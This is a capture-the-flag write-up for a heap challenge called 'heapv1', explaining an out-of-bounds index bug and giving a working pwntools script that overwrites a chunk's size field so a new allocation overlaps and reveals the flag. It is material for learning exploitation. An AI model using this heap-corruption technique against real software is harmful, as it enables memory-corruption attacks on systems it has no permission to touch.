# heapv1

The challenge is heap related and allows us to generate a chunk of custom size and to write the contents of the chunk. It also allows us multiple chances to allocate chunks and compares if the content of the chunk is the flag. We can modify a character inside a chunk.

The bug here is that the index is not checked and we can write outside the chunk. We simply overwrite the size of the current chunk to a large value such as `0x90`. Since, we overwrote the size to a large value, it overlaps the flag chunk and when we allocate a chunk of size `0x90 - 0x10`(0x10 is heap metatdata size for a chunk), we get the flag inside the chunk. The program errors as it tries to free this corrupted chunk but the flag is already printed.

```python
from pwn import *
context.arch = "amd64"

def send_chunk(size, data):
	io.sendlineafter(b": ", size)
	io.sendlineafter(b": ", data)

io = process("./chal")
# io = remote("amt.rs", 31176)

if args.GDB:
	gdbscript="""
	b main
	"""
	gdb.attach(io, gdbscript=gdbscript)


send_chunk(b"64", b"A"*64) # initial chunk
send_chunk(b"64", b"A"*64) # ptr chunk

# change char
io.sendlineafter(b"index: ", b"-8")
io.sendlineafter(b"character: ", p8(0x90))

send_chunk(b"128", b"A"*128)

io.interactive()
```